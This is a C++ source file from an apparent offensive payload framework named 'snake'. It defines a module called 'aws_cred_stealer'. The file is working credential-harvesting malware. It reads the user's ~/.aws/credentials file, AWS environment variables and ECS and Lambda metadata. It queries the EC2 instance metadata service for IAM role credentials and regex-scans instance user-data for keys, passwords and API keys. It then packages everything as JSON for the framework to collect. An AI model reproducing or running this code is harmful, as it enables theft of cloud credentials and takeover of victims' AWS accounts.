#include <cstdlib>
#include <regex>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;
using json = nlohmann::json;

std::string user_home() {
    const char* h = getenv("HOME");
    return (h != nullptr) ? std::string(h) : std::string();
}

json parse_aws_credentials(const std::string& content) {
    json creds = json::object();
    std::regex re(R"(\[(.*?)\]([^[]+))");
    auto begin = std::sregex_iterator(content.begin(), content.end(), re);
    auto end = std::sregex_iterator();
    for (auto it = begin; it != end; ++it) {
        std::string profile_name = trim((*it)[1].str());
        std::string profile_content = trim((*it)[2].str());
        json profile = json::object();
        for (const auto& raw : split(profile_content, '\n')) {
            std::string line = trim(raw);
            size_t eq = line.find('=');
            if (eq == std::string::npos) continue;
            profile[trim(line.substr(0, eq))] = trim(line.substr(eq + 1));
        }
        if (!profile.empty()) creds[profile_name] = profile;
    }
    return creds;
}

json get_ec2_metadata_credentials() {
    HttpResponse token_resp = http_request("PUT", "http://169.254.169.254/latest/api/token",
                                           {{"X-aws-ec2-metadata-token-ttl-seconds", "21600"}});
    if (!token_resp.ok) return json();
    std::string token = trim(token_resp.body);
    if (token.empty()) return json();

    HttpResponse role_resp = http_get("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                                      {{"X-aws-ec2-metadata-token", token}});
    if (!role_resp.ok || role_resp.status != 200) return json();
    std::string role = trim(role_resp.body);
    if (role.empty()) return json();

    json result = json::object();
    result["role_name"] = role;

    HttpResponse cred_resp = http_get(
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role,
        {{"X-aws-ec2-metadata-token", token}});
    if (!cred_resp.ok) return result;
    json cred_data = json::parse(cred_resp.body, nullptr, false);
    if (cred_data.is_object()) {
        for (auto it = cred_data.begin(); it != cred_data.end(); ++it) result[it.key()] = it.value();
    }
    return result;
}

json check_ec2_userdata() {
    HttpResponse resp = http_get("http://169.254.169.254/latest/user-data",
                                 {{"X-aws-ec2-metadata-token", "required"}});
    if (!resp.ok) return json();
    if (resp.body.empty()) return json();

    struct Pattern {
        const char* name;
        const char* expr;
        bool icase;
    };
    const Pattern patterns[] = {
        {"aws_access_key", R"(AKIA[0-9A-Z]{16})", false},
        {"aws_secret_key", R"([0-9a-zA-Z/+]{40})", false},
        {"password", R"(password[=:]\s*(\S+))", true},
        {"api_key", R"(api[_-]?key[=:]\s*(\S+))", true},
    };
    json result = json::object();
    for (const auto& p : patterns) {
        std::regex re(p.expr, p.icase ? std::regex::icase : std::regex::ECMAScript);
        json matches = json::array();
        auto begin = std::sregex_iterator(resp.body.begin(), resp.body.end(), re);
        auto end = std::sregex_iterator();
        for (auto it = begin; it != end && matches.size() < 3; ++it)
            matches.push_back((*it)[0].str());
        if (!matches.empty()) result[p.name] = matches;
    }
    return result;
}

class AWSCredStealer : public Payload {
  public:
    const char* name() const override { return "aws_cred_stealer"; }
    const char* category() const override { return "credential"; }
    const char* description() const override {
        return "Harvest AWS credentials from metadata endpoint, env vars, config files, disk";
    }

    Output execute(const Args&) const override {
        OJ out = OJ::object();
        out["timestamp"] = now_rfc3339();

        json credentials = json::object();

        std::string data;
        if (read_file(user_home() + "/.aws/credentials", data))
            credentials["cli_credentials"] = parse_aws_credentials(data);

        json env_creds = json::object();
        for (const char* v : {"AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
                              "AWS_DEFAULT_REGION"}) {
            const char* val = getenv(v);
            if (val != nullptr && *val != '\0') env_creds[v] = val;
        }
        if (!env_creds.empty()) credentials["environment"] = env_creds;

        json imds = get_ec2_metadata_credentials();
        if (!imds.is_null() && !imds.empty()) credentials["instance_metadata"] = imds;

        const char* ecs_uri = getenv("ECS_CONTAINER_METADATA_URI");
        if (ecs_uri != nullptr && *ecs_uri != '\0') {
            HttpResponse resp = http_get(std::string(ecs_uri) + "/task", {});
            if (resp.ok) {
                json parsed = json::parse(resp.body, nullptr, false);
                if (parsed.is_object()) credentials["ecs_task"] = parsed;
            }
        }

        json lambda_vars = json::object();
        for (const char* v : {"AWS_LAMBDA_FUNCTION_NAME", "AWS_LAMBDA_FUNCTION_VERSION", "_HANDLER"}) {
            const char* val = getenv(v);
            if (val != nullptr && *val != '\0') lambda_vars[v] = val;
        }
        if (!lambda_vars.empty()) credentials["lambda"] = lambda_vars;

        out["credentials"] = credentials;

        json userdata = check_ec2_userdata();
        if (!userdata.is_null() && !userdata.empty()) out["userdata_secrets"] = userdata;

        std::string s = MarshalJSON(out);
        return Output(s.begin(), s.end());
    }
};

AWSCredStealer g_aws;

struct Reg { Reg() { Register(&g_aws); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
